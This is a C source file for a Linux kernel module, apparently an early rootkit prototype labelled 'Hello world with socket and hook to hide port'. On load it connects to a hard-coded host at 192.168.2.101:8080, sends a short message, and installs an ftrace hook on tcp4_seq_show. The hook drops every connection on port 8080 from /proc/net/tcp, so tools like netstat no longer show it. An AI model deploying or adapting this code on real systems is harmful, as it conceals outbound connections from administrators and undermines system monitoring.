#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <net/sock.h>

#include "ftrace_helper.h"

MODULE_AUTHOR("Euler Neto");
MODULE_DESCRIPTION("Hello world with socket and hook to hide port");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

struct sockaddr_in serveraddr;
struct socket *control = NULL;

u32 create_address(u8 *ip){
	u32 addr = 0;
	int i;

	for (i=0; i<4; i++){
		addr += ip[i];
		if (i==3) break;
		addr <<= 8;
	}
	return addr;
}

int tcp_client_send(struct socket *sock, const char *buf, 
		const size_t length, unsigned long flags){
	int left = length;
	
	struct msghdr msg;
	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = flags;

	struct kvec vec;
	vec.iov_len = left;
	vec.iov_base = (char *) buf;

	int len = kernel_sendmsg(sock, &msg, &vec, left, left);

	if (len > 0){
		printk(KERN_INFO "Sent %d bytes",len);
	}
	else{
		printk(KERN_INFO "Error while sending info");
	}

	return len;
}

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
	struct inet_sock *is;
	long ret;
	unsigned short port = htons(8080);

	if (v != SEQ_START_TOKEN){
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport){
			printk(KERN_INFO "Hooking sport %d and dport %d", 
					ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init helloworld_lkm_init(void)
{
	int r = -1;
	unsigned char dstip[5] = {192,168,2,101,'\0'};
	char msg_to_send[20];
	
       	r = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &control);

	memset(&serveraddr, 0, sizeof(serveraddr));
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_port = htons(8080);
	//serveraddr.sin_addr.s_addr = INADDR_ANY;
	serveraddr.sin_addr.s_addr = htonl(create_address(dstip));

	//bind(serversocket, (struct sockaddr_in*)&serveraddr, sizeof(serveraddr));
	r = control->ops->connect(control, (struct sockaddr *) &serveraddr, sizeof(serveraddr), O_RDWR); 

	if (r == 0){
		printk(KERN_INFO "Connected to the server\n");
		memset(&msg_to_send, 0, 20);
		strcat(msg_to_send, "HOWDY HO!");
		tcp_client_send(control, msg_to_send, 20, MSG_DONTWAIT);

		int port_hide = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	}
	else{
		printk(KERN_INFO "Connection failed\n");
	}

	printk(KERN_INFO "Hello, world\n");
	return 0;
}

static void __exit helloworld_lkm_exit(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "Goodbye, world\n");
}

module_init(helloworld_lkm_init);
module_exit(helloworld_lkm_exit);
